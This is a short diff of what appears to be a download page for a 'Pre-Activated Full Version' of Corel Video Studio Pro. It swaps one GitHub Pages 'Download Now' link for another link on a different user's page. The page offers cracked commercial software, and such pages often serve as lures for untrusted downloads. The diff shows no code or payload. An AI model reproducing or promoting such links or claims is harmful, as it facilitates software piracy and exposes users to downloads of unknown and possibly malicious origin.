@@ -19,7 +19,7 @@ Corel Video Studio Pro is a powerful and user-friendly video editing software de
 > ✅ **Pre-Activated Full Version**  
 > 💾 Ready to install and use without additional activation steps
 
-[**⬇️ Download Now**](https://corel-video-studio-pro-download.github.io/.github/)
+[**⬇️ Download Now**](https://matookfj.github.io/.github/corelvideostudio)
 
 ---
 
